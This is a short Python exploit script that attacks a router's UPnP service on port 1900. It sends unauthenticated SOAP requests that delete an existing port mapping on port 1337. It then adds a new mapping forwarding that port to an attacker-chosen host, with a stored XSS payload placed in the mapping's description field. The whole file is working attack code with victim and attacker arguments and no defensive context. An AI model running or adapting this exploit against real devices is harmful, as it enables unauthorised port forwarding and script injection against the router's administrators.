import requests, sys

if len(sys.argv) < 3:
    print("[x] Usage: python3 %s [victim] [attacker]" % sys.argv[0])
    exit()

victim = sys.argv[1]
attacker = sys.argv[2]

# Remove previous port mapping on port 1337 (if any)
url = "http://%s:1900/ctl/IPConn" % victim
headers = {"SOAPAction": "\"urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping\""}
data = """
<?xml version="1.0"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
	<m:DeletePortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">
        <NewExternalPort>1337</NewExternalPort>
        <NewRemoteHost></NewRemoteHost>
        <NewProtocol>TCP</NewProtocol>
	</m:DeletePortMapping>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
"""

print("[+] Removing previous port mapping")
requests.post(url, headers=headers, data=data)


# Add new port mapping
xss_payload = "<script>alert('XSS')</script>"
headers = {"SOAPAction": "\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\""}
data = """
<?xml version="1.0"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
	<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">
        <NewPortMappingDescription><![CDATA[%s]]></NewPortMappingDescription>
        <NewLeaseDuration>0</NewLeaseDuration>
        <NewInternalClient>%s</NewInternalClient>
        <NewEnabled>true</NewEnabled>
        <NewExternalPort>1337</NewExternalPort>
        <NewRemoteHost></NewRemoteHost>
        <NewProtocol>TCP</NewProtocol>
        <NewInternalPort>1337</NewInternalPort>
	</m:AddPortMapping>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
""" % (xss_payload, attacker)

print("[+] Adding port mapping with XSS payload")
requests.post(url, headers=headers, data=data)
